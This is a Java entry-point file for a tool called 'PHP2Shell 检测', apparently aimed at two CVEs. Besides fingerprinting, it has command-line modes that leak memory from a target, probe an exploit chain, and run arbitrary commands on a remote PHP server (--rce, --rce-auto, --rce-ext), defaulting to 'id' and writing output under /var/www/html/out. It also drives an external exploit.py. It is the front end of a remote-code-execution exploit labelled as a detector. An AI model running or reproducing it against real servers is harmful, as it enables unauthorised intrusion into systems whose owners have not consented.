package p2s;

import javax.imageio.ImageIO;
import javax.swing.*;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.File;
import java.util.List;
import java.util.Set;

/** 入口：默认开界面；--selftest 跑引擎自检；--demo 渲染界面截图。 */
public final class Main {

    public static void main(String[] args) throws Exception {
        for (String a : args) {
            if (a.equals("--selftest")) { selftest(args); return; }
            if (a.equals("--demo")) { demo(args); return; }
            if (a.equals("--demo-rce")) { demoRce(args); return; }
            if (a.equals("--fontcheck")) {
                fontCheck(args.length > 1 && !args[1].startsWith("--") ? args[1] : "fontcheck.png");
                return;
            }
            if (a.equals("--probe")) { probeCli(args); return; }
            if (a.equals("--logcheck")) { logCheck(); return; }
            if (a.equals("--rce")) { rceCli(args); return; }
            if (a.equals("--rce-ext")) { rceExtCli(args); return; }
            if (a.equals("--chain")) {
                if (args.length < 2) { System.out.println("用法: --chain <url>"); System.exit(2); }
                RceEngine.ChainProbe cp = new RceEngine().probeChain(args[1]);
                System.out.println("version      : " + (cp.version.isEmpty() ? "未知" : cp.version));
                System.out.println("startupOOM   : " + cp.startupOom);
                System.out.println("workerAlive  : " + cp.workerAlive);
                System.out.println("chainA(leak) : " + cp.leakOk);
                System.out.println("chainB(damage): " + cp.teardownDamage);
                System.out.println("chain        : " + cp.chain);
                System.out.println("note         : " + cp.note);
                System.exit(0);
            }
            if (a.equals("--rce-auto")) {
                if (args.length < 2) { System.out.println("用法: --rce-auto <url> [命令]"); System.exit(2); }
                String url = args[1];
                String cmd = args.length > 2
                        ? String.join(" ", java.util.Arrays.copyOfRange(args, 2, args.length)) : "id";
                String out = new RceEngine().execAuto(url, cmd, "/var/www/html/out", "/out",
                        0x50000, 0xC0000, new int[]{0x160, 0x100, 0x130, 0x190},
                        s -> System.out.println(s));
                System.out.println("=== 输出 ===");
                System.out.println(out);
                System.exit(out.startsWith("【B") || out.startsWith("未判定") ? 1 : 0);
            }
            if (a.equals("--leak")) {
                if (args.length < 2) { System.out.println("用法: --leak <url>"); System.exit(2); }
                System.out.println(new RceEngine().debugLeak(args[1]));
                System.exit(0);
            }
            if (a.equals("--help") || a.equals("-h")) {
                System.out.println("""
                        PHP2Shell 检测（CVE-2026-109618 / CVE-2026-109619）
                          默认        打开图形界面
                          --selftest <url>   无界面自检（只跑指纹）
                          --demo <out.png>   渲染界面并截图（自检版式）
                        L4 需要外部载荷：
                          -Dp2s.python=python -Dp2s.exploit=<exploit.py 路径>
                        """);
                return;
            }
        }
        try { UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName()); } catch (Exception ignored) { }
        SwingUtilities.invokeLater(() -> new MainFrame().setVisible(true));
    }

    /* ---------------------------- 外部脚本 CLI ---------------------------- */
    private static void rceExtCli(String[] args) throws Exception {
        if (args.length < 3) {
            System.out.println("用法: java -jar p2s-detector.jar --rce-ext <url> <脚本路径> [命令]");
            System.exit(2);
        }
        String url = args[1];
        String raw = RcePanel.cleanPath(args[2]);
        String cmd = args.length > 3
                ? String.join(" ", java.util.Arrays.copyOfRange(args, 3, args.length)) : "id";
        File f = RcePanel.resolveScript(raw);
        if (f == null) {
            System.out.println("脚本路径无法解析：" + raw);
            System.out.println("请用绝对路径，例如 D:\\\\tools\\\\exploit.py（含空格可加引号）");
            System.exit(2);
        }
        System.out.println("target : " + url);
        System.out.println("script : " + f.getAbsolutePath());
        System.out.println("command: " + cmd);
        String out = RcePanel.runExternalStatic(url, cmd, "/var/www/html/out", "/out",
                "python", f.getAbsolutePath(),
                "--host {host} --port {port} --path {path} --cmd \"{cmd}\" --fetch {fetchurl}",
                System.out::println);
        System.out.println("=== 输出 ===");
        System.out.println(out);
        System.exit(out.startsWith("（脚本无输出") ? 1 : 0);
    }

    /* ------------------------------- RCE CLI ------------------------------- */
    private static void rceCli(String[] args) throws Exception {
        if (args.length < 2) {
            System.out.println("用法: java -jar p2s-detector.jar --rce <url> [命令]");
            System.exit(2);
        }
        String url = args[1];
        String cmd = args.length > 2
                ? String.join(" ", java.util.Arrays.copyOfRange(args, 2, args.length)) : "id";
        System.out.println("target : " + url);
        System.out.println("command: " + cmd);
        RceEngine e = new RceEngine();
        String out = e.exec(url, cmd, "/var/www/html/out", "/out",
                0x50000, 0xC0000, new int[]{0x160, 0x100, 0x130, 0x190},
                s -> System.out.println(s));
        System.out.println("=== 输出 ===");
        System.out.println(out);
        System.exit(out.startsWith("泄漏失败") || out.startsWith("未命中") ? 1 : 0);
    }

    /* --------------------------- 无界面批量/单发 --------------------------- */
    private static void probeCli(String[] args) {
        if (args.length < 3) {
            System.out.println("用法: java -jar p2s-detector.jar --probe <url> <fingerprint,trigger,leak,rce>");
            System.exit(2);
        }
        String url = args[1];
        java.util.Set<String> levels = new java.util.LinkedHashSet<>(
                java.util.Arrays.asList(args[2].split(",")));
        Probe.Result r = Probe.probe(url, levels, 3, 120);
        System.out.println("target : " + r.url);
        if (r.fp != null) System.out.printf("finger : %s  %s (%s)%n", r.fp.version, r.fp.verdict, r.fp.note);
        if (r.tr != null) System.out.printf("trigger: hit=%s alive_after=%s %.1fs%n",
                r.tr.hit, r.tr.aliveAfter, r.tr.seconds);
        if (r.lk != null) System.out.printf("leak   : %s control=%s decoded=%d%n",
                r.lk.verdict, r.lk.control, r.lk.decodedLen);
        if (r.rc != null) System.out.printf("rce    : hit=%s %.1fs  %s%n", r.rc.hit, r.rc.seconds, r.rc.detail);
        System.out.println(MainFrame.toJson(java.util.List.of(r)));
        System.exit(r.rc != null && r.rc.hit ? 0 : 1);
    }

    /* ------------------------------ 自检 ------------------------------ */
    private static void selftest(String[] args) {
        String url = args.length > 1 && !args[1].startsWith("--")
                ? args[1] : "http://127.0.0.1:8080/index.php";
        System.out.println("selftest: " + url);
        System.out.println("规范化: " + Probe.normalize(url));
        long t0 = System.nanoTime();
        Probe.Result r = Probe.probe(url, Set.of("fingerprint"), 3, 15);
        System.out.printf("指纹: version=%s verdict=%s (%s)  %.2fs%n",
                r.fp.version, r.fp.verdict, r.fp.note, (System.nanoTime() - t0) / 1e9);
        String json = MainFrame.toJson(List.of(r)).replace("\n", " ");
        System.out.println("JSON 片段: " + json.substring(0, Math.min(200, json.length())) + " …");
        System.exit(r.fp.ok ? 0 : 1);
    }

    /* ---------------------------- RCE 页截图 ---------------------------- */
    private static void demoRce(String[] args) throws Exception {
        String out = args.length > 1 && !args[1].startsWith("--")
                ? args[1] : "p2s-jar-rce.png";
        UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
        final MainFrame[] holder = new MainFrame[1];
        SwingUtilities.invokeAndWait(() -> {
            MainFrame f = new MainFrame();
            f.setLocation(30, 30);
            f.setVisible(true);
            f.showRceTab();
            f.rcePanel().setTarget("http://127.0.0.1:8080/index.php");
            f.toFront();
            holder[0] = f;
        });
        MainFrame f = holder[0];
        Thread.sleep(600);
        Point p = f.getLocationOnScreen();
        BufferedImage img = new Robot().createScreenCapture(
                new Rectangle(p.x, p.y, f.getWidth(), f.getHeight()));
        ImageIO.write(img, "png", new File(out));
        System.out.println("saved " + out + " (" + img.getWidth() + "x" + img.getHeight() + ")");
        SwingUtilities.invokeAndWait(f::dispose);
        System.exit(0);
    }

    /* ---------------------------- 清空日志自检 ---------------------------- */
    /** 往日志区写几行，点一次「清空日志」，断言内容为空 */
    private static void logCheck() throws Exception {
        UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
        final MainFrame[] holder = new MainFrame[1];
        SwingUtilities.invokeAndWait(() -> holder[0] = new MainFrame());
        MainFrame f = holder[0];
        RcePanel p = f.rcePanel();
        p.dbgAppend("line-1 测试内容 abc");
        p.dbgAppend("line-2 测试内容 def");
        SwingUtilities.invokeAndWait(() -> { });
        String before = p.dbgText();
        SwingUtilities.invokeAndWait(() -> p.dbgClearButton().doClick());
        SwingUtilities.invokeAndWait(() -> { });
        String after = p.dbgText();
        boolean ok = before.contains("line-1")
                && !after.contains("line-1") && !after.contains("line-2")
                && after.lines().filter(s -> !s.isBlank()).count() <= 1;   // 只允许留一行清空确认
        System.out.println("before: " + before.replace("\n", "\\n"));
        System.out.println("after : [" + after.strip() + "]");
        System.out.println(ok ? "PASS 清空日志生效（原内容已清掉，仅保留一行确认）" : "FAIL 未清空或写入失败");
        SwingUtilities.invokeAndWait(f::dispose);
        System.exit(ok ? 0 : 1);
    }

    /* ---------------------------- 字体自检 ---------------------------- */
    /** 验证"能显示中文的字体"：打印 canDisplayUpTo，并渲染一张图供目视 */
    private static void fontCheck(String out) throws Exception {
        String sample = "执行日志 路径格式说明 占位符 D:\\tools\\exploit.py {host} {cmd}";
        String[] names = {"Consolas", "Microsoft YaHei UI", Font.MONOSPACED, Font.DIALOG};
        for (String n : names) {
            Font f = new Font(n, Font.PLAIN, 13);
            int bad = f.canDisplayUpTo(sample);
            System.out.printf("%-22s canDisplayUpTo=%3d  %s%n", n, bad,
                    bad < 0 ? "全部可显示" : "缺字: " + sample.substring(bad, Math.min(bad + 4, sample.length())));
        }
        int rowH = 30;
        java.awt.image.BufferedImage img = new java.awt.image.BufferedImage(
                880, rowH * names.length + 12, java.awt.image.BufferedImage.TYPE_INT_RGB);
        java.awt.Graphics2D g = img.createGraphics();
        g.setColor(Color.WHITE);
        g.fillRect(0, 0, img.getWidth(), img.getHeight());
        g.setRenderingHint(java.awt.RenderingHints.KEY_TEXT_ANTIALIASING,
                java.awt.RenderingHints.VALUE_TEXT_ANTIALIAS_ON);
        g.setColor(Color.BLACK);
        int y = 24;
        for (String n : names) {
            g.setFont(new Font(n, Font.PLAIN, 14));
            g.drawString(String.format("%-20s %s", n, sample), 8, y);
            y += rowH;
        }
        g.dispose();
        ImageIO.write(img, "png", new File(out));
        System.out.println("saved " + out);
        System.exit(0);
    }

    /* ------------------------------ 截图 ------------------------------ */
    private static void demo(String[] args) throws Exception {
        String out = args.length > 1 && !args[1].startsWith("--")
                ? args[1] : "p2s-jar-preview.png";
        UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
        final MainFrame[] holder = new MainFrame[1];
        SwingUtilities.invokeAndWait(() -> {
            MainFrame f = new MainFrame();
            f.setTargets("http://127.0.0.1:8080/index.php\n"
                    + "http://127.0.0.1:8080/index.php\n"
                    + "http://127.0.0.1:8099/none\n");
            f.selectFingerprintOnly();
            f.setLocation(30, 30);
            f.setVisible(true);
            f.toFront();
            f.startFromCode();
            holder[0] = f;
        });
        MainFrame f = holder[0];
        for (int i = 0; i < 120 && f.resultCount() < 3; i++) Thread.sleep(150);
        SwingUtilities.invokeAndWait(() -> {
            f.selectFirstRow();
            f.repaint();
        });
        Thread.sleep(400);
        Point p = f.getLocationOnScreen();
        Rectangle rect = new Rectangle(p.x, p.y, f.getWidth(), f.getHeight());
        BufferedImage img = new Robot().createScreenCapture(rect);
        ImageIO.write(img, "png", new File(out));
        System.out.println("saved " + out + " (" + img.getWidth() + "x" + img.getHeight() + ")");
        SwingUtilities.invokeAndWait(f::dispose);
        System.exit(0);
    }

    private Main() {}
}
